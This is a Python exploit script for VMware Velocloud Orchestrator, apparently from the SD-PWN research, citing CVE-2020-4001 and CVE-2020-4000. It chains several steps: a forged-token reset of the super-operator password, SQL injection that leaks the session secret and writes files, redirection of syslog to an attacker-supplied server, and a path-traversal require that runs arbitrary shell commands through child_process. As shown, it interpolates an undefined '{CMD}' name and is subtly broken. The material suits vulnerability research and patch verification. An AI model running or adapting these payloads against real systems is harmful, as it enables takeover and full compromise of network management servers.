"""
    VMware Velocloud Orchestrator RCE
    By Ariel Tempelhof of Realmode Labs
    Part of SD-PWN
    Using the following CVE:
        CVE-2020-4001
        CVE-2020-4000
    Other CVEs you should check out:
        CVE-2020-3984
"""

import requests
import json
import async_syslog_server
import argparse


class VelocloudClient:
    def __init__(self, host):
        if host.endswith("/"):
            host = host[:-1]
        self.host = host
        self.s = requests.session()
        self.s.verify = False

    def send_post_request(self, uri, **kwargs):
        if uri.startswith("/"):
            uri = uri[1:]

        res = self.s.post(f"{self.host}/{uri}", **kwargs)
        print(res.status_code)
        print(res.text)
        return res

    def password_reset(self, user="super@velocloud.net",
                       new_password="testpass",
                       password_hash="f90b59f737bcdbfc7267b619508d426b3531446b5869ec5133d0f109ee744246",
                       logical_id="c9408004-2b42-11e9-a642-0ad57a9a2532"):
        token_data = {"username": user, "userType": "OPERATOR",
                      "logicalId": logical_id,
                      "expiration": "test", "hash": password_hash}

        json_data = {"username": user, "password": new_password, "userType": "OPERATOR",
                     "token": "{CLEAR}" + json.dumps(token_data),
                     "userId": 5}

        res = self.send_post_request("/login/doResetPassword.html", json=json_data)

    def login(self, user="super@velocloud.net", password="testpass"):
        json_data = {"username": user, "password": password}
        res = self.send_post_request("/portal/rest/login/operatorLogin", json=json_data)

    def reset_and_login(self, user="super@velocloud.net", password="testpass"):
        self.password_reset(user, password)
        self.login(user, password)

    def modulo_sqli(self, injection=None):
        if injection is None:
            injection = '9999 UNION ' \
                        'SELECT a.id, a.networkId, a.name, b.value, a.version, a.buildNumber, a.deviceFamily, ' \
                        'a.updateType, a.deviceCategory, a.buildType, a.manifest, a.blobId ' \
                        'from VELOCLOUD_SOFTWARE_UPDATE a, VELOCLOUD_SYSTEM_PROPERTY b ' \
                        'where a.id = 1 and b.name="session.secret"; -- '

        json_data = {"jsonrpc": "2.0", "method": "softwareUpdate/getSoftwareUpdates",
                     "params": {"with": ["profileCount"], "modulo": 5,
                                "modulus": injection}, "id": 5}
        res = self.send_post_request("/portal/", json=json_data)

    def write_file_in_mysql_folder(self, filename, content):
        content = content.replace('\n', r'\n')

        injection = '9999 UNION ' \
                    f"SELECT '{content}','','','','','','','','','','','' into outfile '/var/lib/mysql-files/{filename}'"
        self.modulo_sqli(injection)

    def get_system_property(self, name):
        json_data = {"name": name}
        res = self.send_post_request("/portal/rest/systemProperty/getSystemProperty", json=json_data)
        data = res.json()
        return data

    def update_system_property(self, id, name, config_data):
        json_data = {"id": id,
                     "_update": {"name": name, "value": json.dumps(config_data), "dataType": "JSON", "isPassword": 0,
                                 "isReadOnly": 0}}
        self.send_post_request("/portal/rest/systemProperty/updateSystemProperty", json=json_data)

    def update_portal_syslog(self, enabled=False, syslog_server="localhost"):
        name = "log.syslog.portal"
        data = self.get_system_property(name)
        config_data = json.loads(data['value'])

        config_data["enable"] = enabled
        config_data["options"]["host"] = syslog_server
        self.update_system_property(data["id"], name, config_data)

    def upload_file(self, name, file_data):
        files = {"file": (name, file_data)}
        self.send_post_request("portal/softwareUpdate/", files=files)

    def upload_file_and_get_filename(self, name, file_data, syslog_server):
        self.update_portal_syslog(True, syslog_server)
        syslog_daemon = async_syslog_server.SyslogServer(name)
        self.upload_file(name, file_data)
        syslog_daemon.wait()
        self.update_portal_syslog()
        return syslog_daemon.filename

    def meta_require(self, filename):
        uri = f"/portal/rest/meta/none?test/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E{filename}"
        self.send_post_request(uri)


def prepare_js_code(cmd):
    js_code = f"const {{ execSync }} = require('child_process');\nlet stdout = execSync('{CMD}');"
    return js_code


def parse_args():
    parser = argparse.ArgumentParser(description='VMware Velocloud Orchestrator RCE')
    parser.add_argument('host', help='Full HTTPS Host')
    parser.add_argument('syslog_server', help='Syslog server IP')
    parser.add_argument('cmd', help="command to run")

    args = parser.parse_args()

    return args


def main():
    args = parse_args()

    vc = VelocloudClient(args.host)
    vc.reset_and_login("super@velocloud.net")

    file_data = prepare_js_code(args.cmd)
    filename = vc.upload_file_and_get_filename("some_random_filename", file_data, args.syslog_server)
    vc.meta_require(filename)


if __name__ == "__main__":
    main()
